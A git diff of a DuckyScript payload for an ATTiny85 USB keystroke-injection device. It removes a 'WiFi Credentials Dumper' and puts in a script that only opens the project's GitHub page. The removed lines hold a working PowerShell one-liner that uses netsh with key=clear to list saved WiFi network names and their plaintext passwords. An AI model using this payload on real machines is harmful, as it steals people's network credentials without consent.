@@ -1,27 +1,15 @@
-REM Title: WiFi Credentials Dumper
-REM Author: ATTiny85 Ducky Project
-REM Description: Dumps saved WiFi credentials using PowerShell
+REM ======================================
+REM Title: Open This Project's GitHub Repository
+REM Author: 3mrgnc3
+REM Description: Opens the ATTiny85 Ducky project repository in default browser
 REM Target: Windows 10/11
+REM ======================================
 
 DUCKY_LANG DE
 DEFINE #HID_DELAY 1200
 
-REM Wait for OS to recognize device
-DELAY 1500
-
-REM Open Windows Terminal
-GUI x
+DELAY 6000
+GUI r
 DELAY #HID_DELAY
-
-REM Select PowerShell (admin not required for this)
-STRINGLN i
-DELAY #HID_DELAY
-
-REM Wait for terminal to open
-DELAY 5000
-
-REM Execute WiFi credential dump command
-STRINGLN netsh wlan show profiles|sls 'All.*P\w*\s*:\s*(.+)$'|%{$n=$_.Matches[0].Groups[1].Value.Trim();$p=(netsh wlan show profile name="$n" key=clear|sls 'K\w*\s*C\w*\s*:\s*(.+)$').Matches[0].Groups[1].Value.Trim();"${n}:$p"} 2>$null|sort -Unique
-
-REM Execute command
+STRINGLN https://github.com/3mrgnc3/attiny85_ducky?tab=readme-ov-file#attiny85-ducky
 ENTER
